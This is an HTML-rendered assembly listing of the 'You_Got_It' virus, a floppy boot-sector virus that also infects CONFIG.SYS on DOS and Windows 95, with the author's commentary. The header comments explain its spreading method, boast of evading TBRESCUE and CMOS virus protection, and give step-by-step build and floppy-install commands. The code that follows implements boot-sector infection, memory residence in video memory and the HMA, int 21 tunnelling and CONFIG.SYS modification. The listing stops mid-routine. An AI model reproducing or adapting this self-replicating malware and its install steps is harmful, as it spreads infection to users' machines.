<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.Multi.Config_Boot.b - yougotit.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; comment *</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Designed by "Q" the Misanthrope</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; The "You_Got_It" virus needed to be made.  Windows 95 has neglected the</span><span class="sc0">
</span><span class="sc1">; floppy boot sector virus long enough.  Windows 95 in it's 32 bit protected</span><span class="sc0">
</span><span class="sc1">; mode has it's own floppy disk routines and doesn't use int 13 or int 40</span><span class="sc0">
</span><span class="sc1">; anymore.  When a floppy boot sector viruses infectes the hard disk of the</span><span class="sc0">
</span><span class="sc1">; Windows 95 computer, it would flag a change in the MBR or DBR indicating</span><span class="sc0">
</span><span class="sc1">; a possible virus attack (not good).  The conclusion, don't hook int 13, hook</span><span class="sc0">
</span><span class="sc1">; int 21.  Problem is, when Windows 95 starts up, it starts in DOS mode then</span><span class="sc0">
</span><span class="sc1">; changes to it's protected mode DOS so int 21 hooked in DOS mode isn't hooked</span><span class="sc0">
</span><span class="sc1">; anymore.  Many of the multipatrite virii will not infect once Windows 95</span><span class="sc0">
</span><span class="sc1">; starts.  If your boot sector virus can infect a program called in your</span><span class="sc0">
</span><span class="sc1">; AUTOEXEC.BAT or your CONFIG.SYS then the virus would go resident.  The</span><span class="sc0">
</span><span class="sc1">; "You_Got_it" virus does this.  It creates a randomly named file and adds</span><span class="sc0">
</span><span class="sc1">; INSTALLH=\AKYTHSQW (name is random) to the CONFIG.SYS file.  Now when</span><span class="sc0">
</span><span class="sc1">; Windows 95's int 21 is called to change the default drive to A: then the</span><span class="sc0">
</span><span class="sc1">; infection occures.  Cool features:  during boot up the virus moves into video</span><span class="sc0">
</span><span class="sc1">; memory then into the High Memory Area (HMA) when dos loads high.  The virus</span><span class="sc0">
</span><span class="sc1">; tunnels int 21 and loads in the HMA with dos. Also the boot sector infection</span><span class="sc0">
</span><span class="sc1">; will not attack the CONFIG.SYS multiple times.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; P.S. This virus will not be detected by Thunderbytes TBRESCUE Boot sector</span><span class="sc0">
</span><span class="sc1">; detector or CMOS virus protection.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; tasm yougotit /m2</span><span class="sc0">
</span><span class="sc1">; tlink yougotit</span><span class="sc0">
</span><span class="sc1">; exe2bin yougotit.exe yougotit.com</span><span class="sc0">
</span><span class="sc1">; format a:/q/u</span><span class="sc0">
</span><span class="sc1">; debug yougotit.com</span><span class="sc0">
</span><span class="sc1">; l 300 0 0 1</span><span class="sc0">
</span><span class="sc1">; w 100 0 0 1</span><span class="sc0">
</span><span class="sc1">; w 300 0 20 1</span><span class="sc0">
</span><span class="sc1">; m 13e,2ff 100</span><span class="sc0">
</span><span class="sc1">; rcx</span><span class="sc0">
</span><span class="sc1">; 1c2</span><span class="sc0">
</span><span class="sc1">; w</span><span class="sc0">
</span><span class="sc1">; q</span><span class="sc0">
</span><span class="sc1">; copy yougotit.com c:\
; edit c:\config.sys</span><span class="sc0">
</span><span class="sc1">; device=\yougotit.com</span><span class="sc0">
</span><span class="sc1">; altf</span><span class="sc0">
</span><span class="sc1">; x</span><span class="sc0">
</span><span class="sc1">; y</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; *</span><span class="sc0">

</span><span class="sc2">.286</span><span class="sc0">

</span><span class="sc5">qseg</span><span class="sc0">            </span><span class="sc9">segment</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">public</span><span class="sc0"> </span><span class="sc12">'CODE'</span><span class="sc0">
                </span><span class="sc9">assume</span><span class="sc0">  </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">qseg</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:</span><span class="sc5">qseg</span><span class="sc4">,</span><span class="sc8">ss</span><span class="sc4">:</span><span class="sc10">nothing</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc4">:</span><span class="sc5">qseg</span><span class="sc0">

</span><span class="sc5">top</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">jmp_install</span><span class="sc0">       </span><span class="sc1">;boot sector data</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">90h</span><span class="sc0">                     
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'MSDOS5.0'</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">512</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc0"> 
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc0"> 
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">2</span><span class="sc0"> 
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">224</span><span class="sc0"> 
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">2880</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0F0h</span><span class="sc0"> 
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">9</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">18</span><span class="sc0"> 
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">2</span><span class="sc0"> 

                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc2">003eh</span><span class="sc0">

</span><span class="sc5">com_install</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">go_mem_res</span><span class="sc0">
</span><span class="sc5">com_install</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">jmp_install</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">                    </span><span class="sc1">;floppy boot up</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">                      </span><span class="sc1">;for the retf to 0000:7c00</span><span class="sc0">
</span><span class="sc5">id</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">7c00h</span><span class="sc0">                </span><span class="sc1">;7c00 is the infection marker</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;bx=7c00</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">                      </span><span class="sc1">;for the retf to 0000:7c00</span><span class="sc0">
        </span><span class="sc6">cld</span><span class="sc0">     
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                   </span><span class="sc1">;if monochrome copy code to</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">;7c00:7c00</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">0449h</span><span class="sc4">],</span><span class="sc2">07h</span><span class="sc0"> </span><span class="sc1">;check if monochrome</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">monochrome</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0b700h</span><span class="sc0">                  </span><span class="sc1">;lets reside in video memory</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                      </span><span class="sc1">;no need for that TOM</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">id</span><span class="sc4">-</span><span class="sc5">top</span><span class="sc4">],</span><span class="sc8">si</span><span class="sc0">
</span><span class="sc5">monochrome</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                      </span><span class="sc1">;check if already mem resident</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">                   </span><span class="sc1">;di=7c00</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">previous_hook</span><span class="sc0"> </span><span class="sc1">;copy loop varable</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">                      </span><span class="sc1">;save it because we will copy</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">                      </span><span class="sc1">;the code twice to b700:7c00</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                   </span><span class="sc1">;and b700:7dfe</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">return_far</span><span class="sc0">              </span><span class="sc1">;goto b700 segment of code</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">                   </span><span class="sc1">;continue copy to b700:7dfe</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">1ah</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc0">              </span><span class="sc1">;only hook int 1a</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">already_res</span><span class="sc0">             </span><span class="sc1">;if already resident don't</span><span class="sc0">
                </span><span class="sc6">movsw</span><span class="sc0">                           </span><span class="sc1">;hook again</span><span class="sc0">
        </span><span class="sc6">movsw</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">interrupt_1a</span><span class="sc4">+</span><span class="sc2">7e00h</span><span class="sc4">-</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0"> </span><span class="sc1">;hook int 1a</span><span class="sc0">
</span><span class="sc5">already_res</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">;read moved floppy boot sector</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0201h</span><span class="sc0">
</span><span class="sc5">jmp_install</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">set_cx_dx</span><span class="sc0">       </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">      
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;code to point to last sector</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;of the root directory of any</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">                  </span><span class="sc1">;floppy disk</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">                     </span><span class="sc1">;read or write boot sector</span><span class="sc0">
</span><span class="sc5">return_far</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">retf</span><span class="sc0">                            </span><span class="sc1">;return to 7c00:0000 or</span><span class="sc0">
</span><span class="sc5">set_cx_dx</span><span class="sc0">       </span><span class="sc9">endp</span><span class="sc0">                            </span><span class="sc1">;resident_21 routine</span><span class="sc0">

</span><span class="sc5">config_line</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"C:\CONFIG.SYS"</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">      </span><span class="sc1">;file to infect</span><span class="sc0">
</span><span class="sc5">install_name</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc3">"INSTALL="</span><span class="sc0">              </span><span class="sc1">;what to add</span><span class="sc0">
</span><span class="sc5">file_name</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc13">"\"                     ;random file name goes here
</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">crlf</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">07h</span><span class="sc0">

</span><span class="sc5">go_mem_res</span><span class="sc0">      </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">                    </span><span class="sc1">;CONFIG.SYS residency</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3501h</span><span class="sc0">                </span><span class="sc1">;get int 1 address for tunnel</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">interrupt_1</span><span class="sc4">-</span><span class="sc5">com_install</span><span class="sc4">+</span><span class="sc2">100h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">25h</span><span class="sc0">                  </span><span class="sc1">;set int 1 for tunnel</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">;ds:dx will be to set it back</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00h</span><span class="sc0">                     </span><span class="sc1">;es=0000h</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">                           </span><span class="sc1">;simulate interrupt stack</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                      </span><span class="sc1">;return to cs:0000 is cd 20</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">01h</span><span class="sc0">                     </span><span class="sc1">;set trap flag</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">26h</span><span class="sc0">                     </span><span class="sc1">;es: override in to int table </span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">02effh</span><span class="sc4">,</span><span class="sc2">21h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc0">          </span><span class="sc1">;jmp far ptr es:[0084]</span><span class="sc0">
</span><span class="sc5">go_mem_res</span><span class="sc0">      </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">interrupt_1</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">                    </span><span class="sc1">;set trap flag, trace int 21</span><span class="sc0">
                </span><span class="sc6">pusha</span><span class="sc0">                           </span><span class="sc1">;save varables</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">sp</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0">                      </span><span class="sc1">;get pointer                      </span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">lds</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc1">;get next instruction address</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc2">02effh</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">go_back</span><span class="sc0">                 </span><span class="sc1">;check if jmp far ?s:[????] </span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc2">001cdh</span><span class="sc0">
                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">02h</span><span class="sc0">                   </span><span class="sc1">;see if called from my int 01</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">toggle_tf</span><span class="sc0">               
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">03h</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;get address segment of jmp</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">03h</span><span class="sc4">],</span><span class="sc2">0f0h</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">go_back</span><span class="sc0">                 </span><span class="sc1">;see if in HMA area</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,((</span><span class="sc5">tail</span><span class="sc4">-</span><span class="sc5">com_install</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">)</span><span class="sc6">SHR</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">)*</span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0ffffh</span><span class="sc0">               </span><span class="sc1">;allocate HMA area for virus</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4a02h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">2fh</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">                      </span><span class="sc1">;is HMA full</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">toggle_tf</span><span class="sc0">               </span><span class="sc1">;if so then just don't bother</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">                      </span><span class="sc1">;move the virus to the HMA</span><span class="sc0">
                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">previous_hook</span><span class="sc4">-</span><span class="sc5">com_install</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">0100h</span><span class="sc0">                </span><span class="sc1">;copy virus to HMA</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movs</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">                      </span><span class="sc1">;now hook the int 21 chain</span><span class="sc0">
                </span><span class="sc6">movsw</span><span class="sc0">                           
                </span><span class="sc6">movsw</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">vbuffer</span><span class="sc4">-</span><span class="sc5">resident_21</span><span class="sc4">)]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0"> </span><span class="sc1">;point to resident 21 code</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
</span><span class="sc5">toggle_tf</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ss</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc1">;toggle the trap flag</span><span class="sc0">
</span><span class="sc5">go_back</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">                            
                </span><span class="sc6">iret</span><span class="sc0">                            
</span><span class="sc5">interrupt_1</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">                            

</span><span class="sc5">interrupt_21</span><span class="sc0">    </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">                    </span><span class="sc1">;hooked in after int 1a sees</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">                           </span><span class="sc1">;that dos loaded during boot</span><span class="sc0">
        </span><span class="sc6">pusha</span><span class="sc0">   
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4bh</span><span class="sc0">                  </span><span class="sc1">;unload if a program starts</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">set_21_back</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3d42h</span><span class="sc0">                </span><span class="sc1">;open c:\config.sys</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">config_line</span><span class="sc4">+</span><span class="sc2">7e00h</span><span class="sc4">-</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">18h</span><span class="sc0">                     </span><span class="sc1">;really it is int 21</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">                </span><span class="sc1">;get date</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">retry_later</span><span class="sc0">             </span><span class="sc1">;unable to open c:\config.sys</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">18h</span><span class="sc0">                     
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">                   </span><span class="sc1">;is c:\config.sys infected</span><span class="sc0">
